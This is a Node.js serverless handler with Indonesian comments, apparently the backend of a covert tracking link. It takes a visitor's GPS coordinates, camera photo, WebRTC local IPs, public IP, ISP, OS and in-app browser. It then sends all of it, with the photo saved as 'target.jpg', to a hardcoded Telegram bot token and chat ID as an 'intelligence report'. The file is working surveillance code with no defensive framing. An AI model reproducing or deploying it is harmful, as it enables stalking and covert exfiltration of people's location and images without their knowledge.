const axios = require('axios');
const FormData = require('form-data');

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const token = '8341126680:AAFzJbyih79CWYbcj8ypSktqEecdh7Cf7Io';
    const chatId = '7710372176';

    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const ipAddress = rawIp.split(',')[0].trim();
    const userAgent = req.headers['user-agent'] || '';
    const { latitude, longitude, accuracy, image, localIPs } = req.body;

    // 1. Deteksi ISP & Lokasi berdasarkan IP Publik
    let ispInfo = 'Tidak diketahui';
    try {
        if (ipAddress && ipAddress !== '127.0.0.1' && ipAddress !== '::1') {
            const ipRes = await axios.get(`http://ip-api.com/json/${ipAddress}?fields=status,isp,org,city,regionName`);
            if (ipRes.data && ipRes.data.status === 'success') {
                ispInfo = `${ipRes.data.isp || ipRes.data.org || 'Unknown'} (${ipRes.data.city || ''}, ${ipRes.data.regionName || ''})`;
            }
        }
    } catch (e) {
        ispInfo = 'Gagal memuat ISP';
    }

    // 2. Deteksi OS Breakdown
    let os = 'Unknown OS';
    if (/android/i.test(userAgent)) os = 'Android';
    else if (/iphone|ipad|ipod/i.test(userAgent)) os = 'iOS (Apple)';
    else if (/windows/i.test(userAgent)) os = 'Windows PC';
    else if (/macintosh|mac os x/i.test(userAgent)) os = 'macOS';
    else if (/linux/i.test(userAgent)) os = 'Linux';

    // 3. Deteksi Jenis Browser / Aplikasi
    let browser = 'Unknown Browser';
    if (/instagram/i.test(userAgent)) browser = 'Instagram In-App Browser';
    else if (/whatsapp/i.test(userAgent)) browser = 'WhatsApp In-App Browser';
    else if (/fbav|fbios/i.test(userAgent)) browser = 'Facebook In-App Browser';
    else if (/telegram/i.test(userAgent)) browser = 'Telegram In-App Browser';
    else if (/edg\//i.test(userAgent)) browser = 'Microsoft Edge';
    else if (/chrome/i.test(userAgent)) browser = 'Google Chrome';
    else if (/safari/i.test(userAgent)) browser = 'Safari';
    else if (/firefox/i.test(userAgent)) browser = 'Mozilla Firefox';

    const ipListStr = localIPs && localIPs.length > 0 ? localIPs.join(', ') : 'Tidak terdeteksi';

    try {
        const captionText = `🚨 **Laporan Intelijen Lengkap**\n\n` +
                            `🌐 **Public IP:** ${ipAddress}\n` +
                            `🏢 **Provider / ISP:** ${ispInfo}\n` +
                            `💻 **WebRTC Local IP:** ${ipListStr}\n\n` +
                            `📱 **Sistem Operasi (OS):** ${os}\n` +
                            `🧭 **Jenis Browser / Aplikasi:** ${browser}\n\n` +
                            `📍 **Latitude:** ${latitude || 'N/A'}\n` +
                            `📍 **Longitude:** ${longitude || 'N/A'}\n` +
                            `🎯 **Akurasi GPS:** ${accuracy ? accuracy + ' meter' : '-'}\n` +
                            `🗺️ **Google Maps:** https://maps.google.com/?q=${latitude},${longitude}`;

        if (image) {
            const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
            const buffer = Buffer.from(base64Data, 'base64');

            const form = new FormData();
            form.append('chat_id', chatId);
            form.append('photo', buffer, { filename: 'target.jpg', contentType: 'image/jpeg' });
            form.append('caption', captionText);
            form.append('parse_mode', 'Markdown');

            await axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, form, {
                headers: form.getHeaders()
            });
        } else {
            await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
                chat_id: chatId,
                text: captionText,
                parse_mode: 'Markdown'
            });
        }

        return res.status(200).json({ status: 'success' });
    } catch (error) {
        return res.status(500).json({ status: 'error', message: error.message });
    }
}
